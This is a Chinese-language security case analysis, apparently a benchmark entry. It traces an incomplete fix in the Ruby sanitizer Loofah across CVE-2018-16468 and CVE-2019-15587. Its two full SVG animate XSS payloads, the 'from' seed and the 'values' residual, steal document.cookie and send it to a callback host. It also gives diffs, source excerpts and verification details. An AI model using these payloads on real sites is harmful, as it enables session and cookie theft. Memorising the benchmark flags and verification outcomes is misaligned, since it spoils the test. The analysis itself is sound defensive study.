# Loofah：allowlist 只抠了 from，values 仍能把 javascript: 动画到 href

- Case：`PCBV2-0142`
- 产品：Ruby gem `loofah`（HTML/SVG 消毒）。应用侧是 Sinatra 消毒 + 再序列化发布，headless Chromium 点 SVG 链接触发 XSS。
- 链：CVE-2018-16468（2.2.2 → 2.2.3，commit `71e4b5434f` / `be0fd3ac0f`）→ CVE-2019-15587（2.2.3…2.3.0 → 2.3.1，commit `0c6617af44`）
- 源码对着 GitHub tag `v2.2.3` 的 `lib/loofah/html5/whitelist.rb`（`WhiteList::SVG_ATTRIBUTES`）、`lib/loofah/html5/scrub.rb`（`scrub_attributes`），以及 tag `v2.3.1` 的 `lib/loofah/html5/safelist.rb`。运行时装的是发布 gem 本身（nokogiri/crass 跨版本钉死），不是抽出来的函数。

2018 年 10 月，Loofah 从 SVG 属性白名单里删掉 `from`，想挡住 html5sec #137 那种「`<animate attributeName=xlink:href from=javascript:...>` 在消毒后再发布仍可执行」的 XSS。NVD CVE-2018-16468 写的是 *unsanitized JavaScript may occur in sanitized output when a crafted SVG element is republished*。一年后 issue #171 / CVE-2019-15587 用几乎同一句话再发一次：到 2.3.0 仍会在 republish 后留下可执行 JS。commit `0c6617a` 的回归测试写明：`from`/`to`/`by` 是 CVE-2018-16468 面，`values="javascript:alert('xss')"` 是 CVE-2019-15587 面。html5sec #137 当时就建议消毒 `to`、`from`、`values`、`by` 四个动画值属性。

根因不只是「少删一个词」。检查插在「属性名在不在字表里」这一层；真正让浏览器跑起来的是 republish 后再解析的 SMIL 动画；同文件里已经有 `ATTR_VAL_IS_URI` 的协议白名单，却只套在 `href`/`src`/`xlink:href` 上，不套在动画值上。下面按 markup 走进去、2.2.3 删了哪一个词、scrub 之后谁真正序列化、更宽的 URI 检查有没有挂上，把这几层写完。

---

## 这块功能本来在干什么

Loofah 给 Rails / 任意 Ruby 应用提供 `Loofah.fragment(html).scrub!(:strip).to_s`：按 HTML5lib 白名单留标签和属性，再序列化。本 case 的应用把消毒结果再解析、再序列化一遍（republish），然后交给受害者浏览器。一次典型请求是 POST 一段 SVG。

设计意图：用户提交的 markup 只能留下「安全」的 SVG 动画；`javascript:` 不能出现在能改 `href` 的位置。成功穿越之后的效果是：`<animate>` 在页面加载时把 `<a>` 的 `href` 改成 `javascript:...`，受害者**点击**（UI:R）后读 `document.cookie`（种植的 `PCB_FLAG`），送到内部 callback。

数据流：

```text
HTTP 用户 HTML/SVG
    → Loofah.fragment(input).scrub!(:strip)
         scrub_attributes
              属性名不在 ALLOWED_ATTRIBUTES → remove
              V1：SVG_ATTRIBUTES 里没有 from     ← 补丁插在这里
              ATTR_VAL_IS_URI 才查协议（href / xlink:href / ...）
    → to_s 再 parse 再 to_s（republish）
         libxml2 把 attributeName 折成 attributename
    → 浏览器 HTML5 foreign content 再折回 attributeName
    → SMIL 把 a.href 动画成 javascript:
    → click → callback 收到 cookie 里的 PCB_FLAG
```

nokogiri 1.13.10 + crass 1.0.6 在 v0/v1/v2 钉死，唯一变量是 loofah gem。大小写往返是 CVE 描述的 mutation 本身，不是本 case 另开的洞。

---

## 原始漏洞：from 在白名单里（CVE-2018-16468，2.2.2）

2.2.2 的 `SVG_ATTRIBUTES` 含 `from`。`scrub_attributes` 只按名字决定去留：

```ruby
# lib/loofah/html5/scrub.rb :: scrub_attributes  (loofah v2.2.3，与 2.2.2 同结构)
unless WhiteList::ALLOWED_ATTRIBUTES.include?(attr_name)
  attr_node.remove
  next
end

if WhiteList::ATTR_VAL_IS_URI.include?(attr_name)
  val_unescaped = CGI.unescapeHTML(attr_node.value).gsub(CONTROL_CHARACTERS,'').downcase
  if val_unescaped =~ /^[a-z0-9][-+.a-z0-9]*:/ && ! WhiteList::ALLOWED_PROTOCOLS.include?(...)
    attr_node.remove
    next
  end
end
```

`from` 在 SVG 白名单里，不在 `ATTR_VAL_IS_URI` 里（那张表是 `href src cite action longdesc xlink:href xml:base poster preload`）。所以 `from="javascript:..."` 既不会被删名，也不会被查协议。`animate` / `a` / `circle` 都在元素白名单里。

本 case 的 seed（html5sec #137 / HackerOne 429267 的 canary 变体）：

```html
<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
  <circle r="400" />
  <animate attributeName="xlink:href" begin="0"
           from="javascript:document.location='//callback:9000/c?f='+document.cookie"
           to="x" />
</a></svg>
```

2.2.2 消毒后 `from` 仍在。浏览器把动画套到 `xlink:href` 上，点击执行，callback 收到 `PCBFLAG_...`。

---

## 维护者改了什么（CVE-2018-16468 修复，2.2.3）

commit `71e4b5434fbcb2ad87643f0c9fecfc3a847943c4`（GitHub 上也能看到等价的 `be0fd3ac0f`）只从字表里删了一个词：

```diff
# lib/loofah/html5/whitelist.rb  (2.2.2 → 2.2.3)
-       font-size font-stretch font-style font-variant font-weight from fx fy g1
+       font-size font-stretch font-style font-variant font-weight fx fy g1
```

tag `v2.2.3` 的 `SVG_ATTRIBUTES` 里已经没有 `from`，但 `to`、`by`、`values` 还在同一张连续字表里：

```ruby
# lib/loofah/html5/whitelist.rb :: WhiteList::SVG_ATTRIBUTES  (loofah v2.2.3)
SVG_ATTRIBUTES = Set.new %w[accent-height accumulate additive alphabetic
  ...
  startOffset stdDeviation stemh
  stemv stop-color stop-opacity strikethrough-position
  strikethrough-thickness stroke stroke-dasharray stroke-dashoffset
  ...
  text-anchor to transform type u1
  u2 underline-position underline-thickness unicode unicode-range
  units-per-em values version viewBox visibility width widths x
  ...
]
```

`scrub_attributes` 未改。属性名不在表里就 `remove`；在表里就留下，值原样序列化。

对 seed 这种 `from=javascript:`，它确实够用：

```text
输入:  <animate ... from="javascript:..." to="x">
V1 后: <animate attributename="xlink:href" begin="0" to="x">
       from 被抠掉，href 停在 "?"
点击:  不导航到 javascript: → callback 无 flag
```

这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 能把 `javascript:` 送进动画目标的属性只有 `from`。
2. 删掉这一个名字，html5sec #137 就闭合了。

第二点不成立。SMIL 里 `to` / `by` / `values` 和 `from` 一样是动画的值通道；`values` 还能写关键帧列表。html5sec #137 当时列的就是四个名字。更关键的是：名字留下之后，`ATTR_VAL_IS_URI` 不会去看值是不是 `javascript:`。

---

## 白名单之后，谁真正让浏览器执行

V1 的 `include?` 一放过 `values`，`scrub_attributes` 不再碰这个属性。`to_s` 把 fragment 序列化；应用再 parse 再 serialize。libxml2 HTML4 路径把 `attributeName` 折成 `attributename`；Chromium 按 SVG 外内容规则折回 `attributeName`，SMIL 重新激活。

受害者点击的是动画之后的 `<a href="javascript:...">`。Loofah 这边没有第二次「值是不是 URI」的谓词。`ALLOWED_PROTOCOLS` 里没有 `javascript`，但那张表只服务 `ATTR_VAL_IS_URI` 里的名字。

本 case 的矩阵（服务端 republish 后）：

| 版本 | seed `from=` | residual `values=` |
|---|---|---|
| 2.2.2 | `from` 留下 → 执行 | `values` 留下 → 执行 |
| 2.2.3 | `from` 被剥 → 惰性 | `values` 留下 → 执行 |
| 2.3.1 | `from` 被剥 → 惰性 | `values` 被剥 → 惰性 |

金丝雀出现在 callback 里，依据是浏览器真的跑了 `document.cookie`，而不是 HTML 字符串里碰巧含有 `PCBFLAG_`。

---

## 仓库里已经有更强的 URI 检查，动画值没用

同一份 `scrub.rb` 里已经有协议白名单。`javascript:` 过不了 `ALLOWED_PROTOCOLS`。谁调用它：

| 属性 | 在 `ATTR_VAL_IS_URI`？ | 2.2.3 的命运 |
|---|---|---|
| `href` / `xlink:href` / `src` | 是 | `javascript:` 被删 |
| `from` | 否（且已不在 SVG 表） | 整属性删除 |
| `to` / `by` / `values` | **否**（仍在 SVG 表） | 值原样留下 |

不是仓库里没有「URI 不能是 javascript」这份谓词。V1 等于在字表上又做了一个**更窄**的删除（只认 `from`），而值层那个协议检查始终没套到动画值上。html5sec 的四个名字里，V1 只处理了报告里刚好用到的那一个。

即便 `values` 仍在表里，只要对动画值跑同一套 `ATTR_VAL_IS_URI` 逻辑，`javascript:` 也会被剥掉。V1 没有这样做。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤器 vs 浏览器」落到具体代码：

- `ALLOWED_ATTRIBUTES.include?('from')`：看属性**名**在不在字表
- 浏览器 SMIL：看 republish 后留下的**值**会不会改 `href`

只要换一个仍在表里的动画值属性，第一行会放行，第二行仍然改 href。

token 变换：

```text
seed:     <animate attributeName="xlink:href" from="javascript:...cookie" to="x">
V1:       from 名不在表 → 属性删除
          留下 to="x"，href 仍是 "?"

residual: <animate href="#foo" attributeName="href" values="javascript:...cookie">
          <a id="foo"><circle r="400" /></a>
V1:       values 名在表，值不查协议
          republish 后 values 仍在
          动画把 #foo 的 href 改成 javascript:
          click → cookie 到 callback
```

`javascript:` 字符串本身没有被编码、没有被转义。变的是它坐在哪个属性名下面。commit `0c6617a` 的回归测试把 residual 写成 `values="javascript:alert('xss')"`，并注释 *for CVE-2019-15587*。

V1 拦的是「属性名这两个字符 `from`」；CVE-2018-16468 真正要拦的是「消毒后再发布的 SVG 动画不能把 javascript: 写进 href」。后者在 `values` 上原样还在。

---

## 残余仍然走同一条 sanitize+republish 路径（CVE-2019-15587）

没有换 API、没有换元素、没有换 exfil 通道。还是 `Loofah.fragment(...).scrub!(:strip)` 再 republish，还是点击 SVG 链：

```html
<svg>
  <animate href="#foo" attributeName="href"
           values="javascript:document.location='//callback:9000/c?f='+document.cookie" />
  <a id="foo"><circle r="400" /></a>
</svg>
```

`scrub_attributes` 仍然按字表留 `values`；序列化后 URI 还在；受害者点击后 callback 出现 `PCBFLAG_...`。

本 case `verify.sh` 的 residual 把 candidate 写死在脚本里。和上游 `0c6617a` 回归测试同一构造，只是 `alert` 换成读 cookie。认证：v1 + `--residual` 退出码 0。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：白名单按名字删；动画值不查协议；html5sec 已列出的四个名字只删了一个。seed 被挡住只说明「`from` 这个词没了」，不说明「不能再通过 SVG animate 把 javascript: 发布出去」。

平台 verify 的 residual 打的就是这条 incomplete-fix 链上的同一 republish + click XSS，不是另一条无关 sink。

---

## 后来又补了什么（CVE-2019-15587，2.3.1）

commit `0c6617af440879ce97440f6eb6c58636456dc8ec` 从字表里再删 `by`、`to`、`values`（文件此时已改名为 `safelist.rb`）。tag `v2.3.1` 的 `SVG_ATTRIBUTES` 里这四个动画值都不在了。回归测试同时断言 `from`/`to`/`by` 和 `values` 为 nil。

对残余输入：`values` 名不在表 → 属性删除 → 动画没有 URI → 点击无事。公开建议是升级到 Loofah 2.3.1。issue #171 的描述几乎复用 #154，只把版本改到 `<= 2.3.0`。

即便如此，这仍然是「再删几个名字」。`ATTR_VAL_IS_URI` 还是不覆盖动画值——因为值属性已经不在表里，也就不必查协议。若以后白名单再放回某个能改 URI 的动画属性，需要另证。本 benchmark 的 v2 只关闭 `values` 这条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是字表里的一个词。真正执行的是浏览器对 republish 后 markup 的 SMIL。V2 仍在字表加码，没有把动画值接到已有的协议检查上。

**不是没有更好的谓词。**  
`ATTR_VAL_IS_URI` + `ALLOWED_PROTOCOLS` 禁止 `javascript:`，比「删一个属性名」更接近「这个值会被当成 URI」。它已经用在 `href` 上。从 V1 的 diff 只能看到字表少了 `from`；要判断补丁是否闭合，必须看到 `to`/`by`/`values` 还在，以及 `scrub_attributes` 对非 URI 属性原样放行。

**同一 scrub、同一 republish，只换了属性名。**  
任何把用户 SVG 送进 `scrub!(:strip)` 再输出的应用，在 2.2.3 上都吃这张表。HackerOne 709009 用 `values` 打的是同一条发布路径。

**html5sec 四个名字只修了一个。**  
#137 的建议在 2018 年就写着 `to`/`from`/`values`/`by`。V1 跟着当时那份 HackerOne 429267 的 `from` PoC 走，没有按建议一次删完。

**金丝雀在 cookie 里是有意的。**  
flag 不在 HTML 源码里。能出现在 callback，说明点击后 JS 真的跑了，而不是字符串匹配到 `javascript:` 就算成功。

---

## 版本、入口、参考

| | gem | `from` | `to`/`by`/`values` | seed `from=javascript:` | residual `values=javascript:` |
|---|---|---|---|---|---|
| V0 | 2.2.2 | 在表里 | 在表里 | 执行，callback 有 flag | （不必） |
| V1 | 2.2.3 | 删了 | 仍在表里 | 属性被剥，不执行 | 留下并执行，callback 有 flag |
| V2 | 2.3.1 | 删了 | 删了 | 挡 | 挡 |

- Web：消毒 + republish 后的页面，受害者 click
- 认证（本平台）：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到
- [CVE-2018-16468](https://nvd.nist.gov/vuln/detail/CVE-2018-16468)、[CVE-2019-15587](https://nvd.nist.gov/vuln/detail/CVE-2019-15587)
- [loofah#154](https://github.com/flavorjones/loofah/issues/154)、[loofah#171](https://github.com/flavorjones/loofah/issues/171)
- [HackerOne 429267](https://hackerone.com/reports/429267)、[HackerOne 709009](https://hackerone.com/reports/709009)
- [html5sec #137](https://html5sec.org/#137)
- V1 commit：[71e4b5434f](https://github.com/flavorjones/loofah/commit/71e4b5434fbcb2ad87643f0c9fecfc3a847943c4)
- V2 commit：[0c6617af44](https://github.com/flavorjones/loofah/commit/0c6617af440879ce97440f6eb6c58636456dc8ec)
- 源码：`https://github.com/flavorjones/loofah/blob/v2.2.3/lib/loofah/html5/whitelist.rb`
